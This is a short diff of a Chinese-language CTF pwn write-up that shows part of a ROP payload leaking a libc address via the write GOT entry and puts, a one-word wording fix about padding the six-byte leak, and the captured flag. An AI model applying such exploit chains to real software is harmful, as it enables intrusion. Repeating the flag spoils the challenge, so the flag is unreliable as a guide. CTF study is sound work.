@@ -116,7 +116,7 @@ payload += p64(elf.got['write'])
 payload += p64(elf.plt['puts'])
 payload += p64(elf.symbols['main']) 
 ```
-结果调试的时候发现地址只输出6个宽字节，一直少两位，调试发现就是6位，用\x00\x00补齐成功。
+结果调试的时候发现地址只输出6个字节，一直少两位，调试发现就是6位，用\x00\x00补齐成功。
 
 __get flag__: flag{__you_are_so_Cu7e_!!}   
 ![](https://raw.githubusercontent.com/ReAbout/ctf-writeup/master/pwn000/images/pwn2.png)<br>
